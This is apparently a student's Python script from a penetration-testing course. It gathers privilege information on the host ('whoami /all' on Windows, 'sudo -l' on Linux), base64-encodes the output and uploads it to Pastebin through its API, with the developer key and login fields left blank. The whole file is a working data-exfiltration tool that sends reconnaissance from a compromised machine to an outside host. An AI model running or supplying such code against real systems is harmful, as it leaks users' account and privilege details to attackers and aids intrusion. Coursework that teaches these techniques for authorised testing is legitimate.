# 2301903733 - DENNIS
# GLS Pastebin
# Programming for Penetration Testing

import base64
from requests import post
from subprocess import Popen, PIPE
from base64 import b64encode
from platform import system
import requests

output = ''
if system() == 'Windows':
    process = Popen("whoami /all", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
    result, err = process.communicate()
    print(result)

elif system() == 'Linux':
    process = Popen("sudo -l", stdin = PIPE , stdout = PIPE, stderr = PIPE, shell = True)
    result, err = process.communicate()
    print(result)

login_url = 'https://pastebin.com/api/api_login.php'
login_data = {
    'api_dev_key': '',
    'api_user_name': '',
    'api_user_password': ''
}
r = requests.post(login_url, data=login_data)
print(r.text)

url = "https://pastebin.com/api/api_post.php"
data = {
    'api_option': 'paste',
    'api_dev_key': '',
    'api_paste_code':base64.b64encode(result),
    'api_user_key': ''
    }

r = requests.post(url, data=data)
print(r.text)
